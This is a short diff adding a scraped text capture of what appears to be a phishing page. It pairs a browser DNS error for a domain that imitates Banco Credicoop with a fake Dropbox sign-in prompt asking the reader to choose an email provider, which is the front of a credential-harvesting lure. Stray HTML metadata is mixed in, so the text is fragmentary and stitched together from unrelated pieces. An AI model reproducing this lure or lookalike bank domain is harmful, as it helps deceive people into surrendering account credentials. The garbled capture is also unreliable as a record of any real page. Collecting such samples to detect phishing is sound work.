@@ -1,0 +1,14 @@
+banccinternet-bancccredicoop-coop.credioops.comThis site can’t be reached
+banccinternet-bancccredicoop-coop.credioops.com’s server DNS address could not be found.
+Try:
+Checking the connection
+Checking the proxy, firewall, and DNS configuration
+Running Windows Network Diagnostics
+ERR_NAME_NOT_RESOLVED
+Reload
+DETAILS   width=device-width, initial-scale=1.0,
+                                 maximum-scale=1.0, user-scalable=no
+DropboxTry Dropbox Business Download the app
+Dropbox
+Now , you can sign in to dropbox with your email
+Select your email provider  IE=edge, chrome=1 text/html; charset=UTF-8 width=device-width, user-scalable=no no-cache 0 no-cache
